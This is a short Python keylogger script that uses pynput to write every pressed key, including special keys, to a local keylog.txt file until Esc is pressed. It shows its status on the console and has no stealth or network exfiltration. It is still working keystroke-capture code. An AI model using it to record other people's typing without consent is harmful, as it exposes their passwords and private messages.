from pynput import keyboard

LOG_FILE = "keylog.txt"

def on_press(key):
    """
    Callback function for when a key is pressed.
    Logs the key to a file.
    """
    try:
        with open(LOG_FILE, "a") as log_file:
            # Handle printable keys
            log_file.write(f"{key.char}")
    except AttributeError:
        with open(LOG_FILE, "a") as log_file:
            # Handle special keys (e.g., Enter, Space, Backspace)
            log_file.write(f" [{key}] ")

def on_release(key):
    """
    Callback function for when a key is released.
    Stops the keylogger when the escape key is pressed.
    """
    if key == keyboard.Key.esc:
        print("Exiting keylogger...")
        return False

if __name__ == "__main__":
    print("Keylogger is running... Press 'Esc' to stop.")

    # Start listening to keyboard events
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
